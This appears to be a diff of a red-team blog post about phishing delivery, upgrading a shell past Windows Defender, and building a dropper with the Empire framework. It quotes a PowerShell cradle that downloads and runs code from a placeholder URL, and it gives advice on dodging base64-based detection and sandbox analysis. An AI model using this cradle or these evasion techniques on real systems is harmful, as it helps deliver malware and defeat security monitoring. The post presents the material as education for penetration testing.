@@ -18,13 +18,13 @@ It took me more than I anticipated to write the second part. The guys from BC-Se
 
 I finished the first part promising that I will apply the theory on some real world cases. Without other words, let's see what scenarios I will approach:
 <ul>
-<li>Scenario 1: I consider I already obtained somehow access in the network via a service exploit, web application vulnerability or through a phishing email. I will explore some ways of upgrading the dumb shell without being detected by WindowsDefender.</li>
- <li>Scenario 2: I was speaking about a RedTeam exercise in my first article, am I right? What RedTeam Exercise is that where I don't make use of a little phishing mail? I will build from 0 a phishing email where I will explore anti-sandbox techniques.</li>
+<li>Scenario 1: I consider I have already obtained access in the network via a service exploit, web application vulnerability or through a phishing email. I will explore some ways of upgrading the dumb shell without being detected by WindowsDefender.</li>
+ <li>Scenario 2: I was talking about a RedTeam exercise in my first article, am I right? What kind of RedTeam Exercise is that if I don't use of a phishing mail? I will build from 0 a phishing email where I will explore anti-sandbox techniques.</li>
 </ul>
 
-I considered that we all encountered situations where we were limited by a dumb shell. We could not upgrade it because of not taking all the necessary measures against a security solution. I found myself in the situation where I could access the target's network only through a phishing email.<br/>
+I considered that we all encountered situations where we were limited by a dumb shell. We could not upgrade it if we do not take all the necessary measures against a security solution. I found myself in the situation where I could access the target's network only through a phishing email.<br/>
 I wanted to develop a simple malware that it uses the multi stager feature of the Empire framework. I want from start that all what I will present, fits on the real world scenarios. <b>Also all what i show you is just in education purposes. Do not apply outside of your network.</b><br/>
-Lets speak a bit about how our phishing mail from the 2nd scenario will look, how I was thinking its arhitecture, what difficulties I am expecting to encounter during its delivery or execution. 
+Lets talk a bit about how our phishing mail from the 2nd scenario will look, how I was thinking its arhitecture, what difficulties I am expecting to encounter during its delivery or execution. 
 
 <ul>
 <li>Phase 1 and 2: They are referring to successful delivery the email in the user's inbox. Depending on the type of infrastructure I am targeting, I expect to encounter a mail protection with the ability to detect and eventualy detonate my attachment in a sandbox. We have to take the proper measures to avoid being detected by the security gateway and in case we are, then we should make sure to instruct my payload to not start the execution process in the analysis machine. In case I am flagged by a security protection, I will have to remake my payload.</li> 
@@ -109,7 +109,7 @@ The Empire's stager (multi/launcher) is coming with the 'encodedcommand' command
 I recommend to turn base64 off. It doesn't add anything to your obfuscation while trying to avoid Defender. It's really just used because it's the easiest way to handle sending the command in a string. Once you have your obfuscated code you can re-encode it if you really want to use this method. <br/>
 Most security related solutions created features for detecting base64 encoded strings and analyzing them after the content is decoded. CarbonBlack, FireEye made public their sollutions' capabilities in the past, being clear for us that the above arguments are using as a part of their detection rules: you can read more <a href="https://www.carbonblack.com/2015/08/14/how-to-detect-powershell-empire-with-carbon-black/" style="text-decoration: none;">here</a> and <a href="https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html" style="text-decoration: none;">here</a>.  
 
-<br/><br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's speak about the dropper before starting with the demo.
+<br/><br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's talk about the dropper before starting with the demo.
 
 ### Dropper <br/>
 Possibly many of you use the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings like "new-object", "Webclient", "downloadstring" are used by many for detecting suspicious events. I will make use of an open source <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> made special for this kind of tasks.<br/>
